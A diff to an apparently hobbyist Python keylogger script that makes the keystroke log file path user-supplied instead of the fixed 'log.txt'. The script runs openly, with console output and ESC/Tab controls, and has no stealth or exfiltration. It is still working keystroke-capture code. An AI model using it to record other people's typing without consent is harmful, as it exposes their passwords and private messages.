@@ -5,14 +5,16 @@ def key_logger() :
     save = True    # A flag to control whether key presses should be saved or not
 
     def on_press(key):      # This function is called when a key is pressed
+        global log_file_path
+
         if hasattr(key, 'char') and save == True:  # Check if the key has the 'char' attribute (i.e., it's a character key) and saving is enabled
             print(f"Alphanumeric key pressed: {key.char}")
-            with open("log.txt", "a") as log_file:       # Open the log file in append mode
+            with open(log_file_path, "a") as log_file:       # Open the log file in append mode
                 log_file.write(f"{key.char}")      # Write the character key to the file
 
         elif (not hasattr(key, 'char')) and save == True : 
             print(f"Special key pressed: {key}")
-            with open("log.txt", "a") as log_file:
+            with open(log_file_path, "a") as log_file:
                 log_file.write(f" {key} ")
 
     def on_release(key):          # This function is called when a key is released
@@ -41,4 +43,6 @@ if __name__ == "__main__" :
     If you want to stop listening, press "ESC"
     If you want to stop saving to file, press "Tab"
     ''')
+    log_file_path = input("Please enter the path where you want to save the logged keys. Please use '/' instead of '\\' in the path :\n")
+    print("Listening started")
     key_logger()
